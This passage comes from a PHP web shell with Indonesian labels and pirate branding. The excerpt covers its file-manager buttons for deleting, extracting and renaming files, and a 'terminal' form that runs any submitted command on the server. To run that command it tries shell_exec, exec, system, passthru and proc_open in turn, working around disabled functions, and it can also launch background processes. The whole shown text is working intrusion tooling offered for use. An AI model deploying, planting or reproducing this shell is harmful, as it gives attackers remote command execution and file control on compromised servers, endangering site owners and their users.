                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__del__=' . urlencode($__item__) . '" onclick="return confirm(\'Delete ' . htmlspecialchars($__item__) . '?\')" class="btn btn-delete">☠️ Delete</a>';
                    if (strtolower(pathinfo($__item__, PATHINFO_EXTENSION)) == 'zip') {
                        echo '<a href="?__d__=' . urlencode($__dir__) . '&__extract__=' . urlencode($__item__) . '" class="btn btn-extract">📦 Extract</a>';
                    }
                    echo '</div>';
                    echo '</td>';
                    echo '<td>';
                    echo '<a href="?__d__=' . urlencode($__dir__) . '&__rename__=' . urlencode($__item__) . '" class="btn btn-rename">📝 Rename</a>';
                    echo '</td>';
                    echo '</tr>';
                }
                ?>
            </tbody>
        </table>
        
        <div class="terminal" id="terminal">
            <h3 style="margin-bottom: 10px; font-size: 15px; font-weight: 900; text-shadow: 0 0 6px rgba(0,255,0,0.6), 0 0 3px rgba(0,0,0,1);">💣 𝐆𝐚𝐬 𝐓𝐞𝐫𝐦𝐢𝐧𝐚𝐥 𝐏𝐚𝐥𝐥𝐤𝐮 💥</h3>
    
            <?php
            $__exec_available__ = [];
            $__exec_functions__ = [
                'shell_exec' => '🚀 Shell Exec',
                'exec' => '⚡ Exec',
                'system' => '💻 System',
                'passthru' => '📡 Passthru',
                'proc_open' => '🔧 Proc Open'
            ];
    
            $__disabled_functions__ = explode(',', ini_get('disable_functions'));
            foreach ($__exec_functions__ as $func => $label) {
                if (function_exists($func) && !in_array($func, $__disabled_functions__)) {
                    $__exec_available__[] = $label;
                }
            }
    
            if (!empty($__exec_available__)) {
                echo '<div style="background:#1a1a1a; padding:6px 12px; margin-bottom:10px; border-left:3px solid #00ff00; font-size:12px; font-weight:800;">';
                echo '<span style="color:#00ff00;">✅ Active:</span> ' . implode(' | ', $__exec_available__);
                echo '</div>';
            }
            ?>
    
            <form method="post" style="display:flex; gap:5px; margin-bottom:10px;">
                <input type="text" name="__cmd__" 
                       value="<?php echo isset($_POST['__cmd__']) ? htmlspecialchars($_POST['__cmd__']) : ''; ?>"
                       placeholder="Contoh: ls -la, pwd, php -v, composer --version" 
                       style="flex:1; padding:10px; background:#111; color:#00ff00; border:1px solid #555; border-radius:3px; font-family:monospace; font-weight:700;">
                <button type="submit" class="btn" style="padding:10px 18px;">▶ Jalankan</button>
                <button type="submit" name="__bg__" value="1" class="btn btn-extract" style="padding:10px 18px;" title="Jalankan di background (untuk proses lama)">⏳ Background</button>
            </form>
    
            <div style="background:#1a1a1a; padding:6px 12px; margin-bottom:10px; border-left:3px solid #FFD700; font-size:12px; color:#e0e0e0; font-weight:800;">
                📂 Current: <span style="color:#00ff00;" id="current-dir"><?php echo htmlspecialchars($__dir__); ?></span>
            </div>
    
            <pre style="background:#111; padding:15px; border-radius:5px; max-height:400px; overflow:auto; font-size:13px; line-height:1.5; border:1px solid #333; font-weight:700;">
        <?php
        if (isset($_POST['__cmd__']) && !empty($_POST['__cmd__'])) {
            $__cmd__ = $_POST['__cmd__'];
            $__background__ = isset($_POST['__bg__']);
    
            echo "<span style='color:#FFD700;font-weight:900;'>$</span> <span style='color:#00ff00;font-weight:900;'>" . htmlspecialchars($__cmd__) . "</span>\n";
            echo "<span style='color:#666;'>" . str_repeat("─", 60) . "</span>\n";
    
            if (!isset($_SESSION['__term_dir__'])) {
                $_SESSION['__term_dir__'] = $__dir__;
            }
    
            if (strpos(trim($__cmd__), 'cd ') === 0) {
                $__new_dir__ = trim(substr($__cmd__, 3));
                if (empty($__new_dir__)) {
                    $__new_dir__ = getcwd();
                } elseif ($__new_dir__[0] !== '/' && strpos($__new_dir__, ':') === false) {
                    $__new_dir__ = $_SESSION['__term_dir__'] . '/' . $__new_dir__;
                }
        
                $__new_dir__ = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $__new_dir__);
                $__new_dir__ = realpath($__new_dir__) ?: $__new_dir__;
                
                if (is_dir($__new_dir__)) {
                    $_SESSION['__term_dir__'] = $__new_dir__;
                    chdir($__new_dir__);
                    echo "<span style='color:#00ff00;font-weight:800;'>✅ Pindah ke: " . htmlspecialchars($__new_dir__) . "</span>\n";
                } else {
                    echo "<span style='color:#ff5555;font-weight:800;'>❌ Direktori tidak ditemukan: " . htmlspecialchars($__new_dir__) . "</span>\n";
                }
            } else {
                $__current_term_dir__ = $_SESSION['__term_dir__'];
                $__original_dir__ = getcwd();
        
                if (is_dir($__current_term_dir__)) {
                    chdir($__current_term_dir__);
                }
        
                if ($__background__) {
                    $__long_commands__ = ['composer', 'npm', 'yarn', 'git clone', 'wget', 'curl', 'php composer'];
                    $__is_long__ = false;
            
                    foreach ($__long_commands__ as $__pattern__) {
                        if (strpos($__cmd__, $__pattern__) !== false) {
                            $__is_long__ = true;
                            break;
                        }
                    }
            
                    if ($__is_long__) {
                        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                            $__bg_cmd__ = 'start /B ' . $__cmd__ . ' > NUL 2>&1';
                        } else {
                            $__bg_cmd__ = $__cmd__ . ' > /dev/null 2>&1 & echo $!';
                        }
                
                        $__output__ = shell_exec($__bg_cmd__);
                        echo "<span style='color:#FFD700;font-weight:800;'>⏳ Proses berjalan di background</span>\n";
                        if (!empty($__output__)) {
                            echo "<span style='color:#00ff00;font-weight:800;'>PID: " . trim($__output__) . "</span>\n";
                        }
                        echo "<span style='color:#e0e0e0;font-weight:700;'>Cek dengan: ps aux | grep PID</span>\n";
                    } else {
                        $__background__ = false;
                    }
                }
        
                if (!$__background__) {
                    $__output__ = '';
                    $__methods__ = [];
            
                    if (function_exists('shell_exec') && !in_array('shell_exec', $__disabled_functions__)) {
                        $__output__ = @shell_exec($__cmd__ . ' 2>&1');
                        $__methods__[] = 'shell_exec';
                    }
            
                    if (empty($__output__) && function_exists('exec') && !in_array('exec', $__disabled_functions__)) {
                        @exec($__cmd__ . ' 2>&1', $__lines__, $__return__);
                        $__output__ = implode("\n", $__lines__);
                        $__methods__[] = 'exec';
                    }
            
                    if (empty($__output__) && function_exists('system') && !in_array('system', $__disabled_functions__)) {
                        ob_start();
                        @system($__cmd__);
                        $__output__ = ob_get_clean();
                        $__methods__[] = 'system';
                    }
            
                    if (empty($__output__) && function_exists('passthru') && !in_array('passthru', $__disabled_functions__)) {
                        ob_start();
                        @passthru($__cmd__);
                        $__output__ = ob_get_clean();
                        $__methods__[] = 'passthru';
                    }
            
                    if (empty($__output__) && function_exists('proc_open') && !in_array('proc_open', $__disabled_functions__)) {
                        $__descriptors__ = [
                            0 => ["pipe", "r"],
                            1 => ["pipe", "w"],
                            2 => ["pipe", "w"]
                        ];
                        $__process__ = @proc_open($__cmd__, $__descriptors__, $__pipes__, $_SESSION['__term_dir__'] ?? null);
                        if (is_resource($__process__)) {
                            $__output__ = stream_get_contents($__pipes__[1]);
                            $__error__ = stream_get_contents($__pipes__[2]);
                            fclose($__pipes__[0]);
                            fclose($__pipes__[1]);
                            fclose($__pipes__[2]);
                            proc_close($__process__);
                    
                            if (!empty($__error__)) {
                                $__output__ .= "\n" . $__error__;
                            }
                            $__methods__[] = 'proc_open';
                        }
                    }
            
                    if (!empty($__methods__)) {
                        echo "<span style='color:#888; font-size:11px;font-weight:700;'>📡 via: " . implode(' → ', $__methods__) . "</span>\n";
                    }
            
                    if (!empty($__output__)) {
                        echo htmlspecialchars($__output__);
                    } else {
                        echo "<span style='color:#ff5555;font-weight:800;'>❌ Tidak ada output atau command execution disabled</span>\n";
                    }
                }
        
                chdir($__original_dir__);
            }
        }
        ?>
            </pre>
    
            <div style="display:flex; flex-wrap:wrap; gap:5px; margin-top:10px;">
                <span style="color:#e0e0e0; font-size:12px; padding:3px 0; font-weight:800;">⚡ Quick:</span>
                <button onclick="document.getElementsByName('__cmd__')[0].value='ls -la';" class="btn" style="padding:5px 10px; font-size:12px;">ls -la</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='pwd';" class="btn" style="padding:5px 10px; font-size:12px;">pwd</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='php -v';" class="btn" style="padding:5px 10px; font-size:12px;">php -v</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='composer --version';" class="btn" style="padding:5px 10px; font-size:12px;">composer</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='npm --version';" class="btn" style="padding:5px 10px; font-size:12px;">npm</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='git --version';" class="btn" style="padding:5px 10px; font-size:12px;">git</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='whoami';" class="btn" style="padding:5px 10px; font-size:12px;">whoami</button>
                <button onclick="document.getElementsByName('__cmd__')[0].value='uname -a';" class="btn" style="padding:5px 10px; font-size:12px;">uname</button>
            </div>
        </div>
        
        <div class="footer">
            🏴‍☠️ BAJAK LAUT | <?php echo date('Y-m-d H:i:s'); ?> | PHP <?php echo PHP_VERSION; ?>
            <br>
            <small style="color:#39FF14; font-size: 11px; font-weight: 800;">ULA KAM SANGSI PAL</small>
        </div>
    </div>
    
    <script>
        function confirmDelete(name) {
            return confirm('Are you sure you want to delete "' + name + '"?');
        }
    </script>
</body>
</html>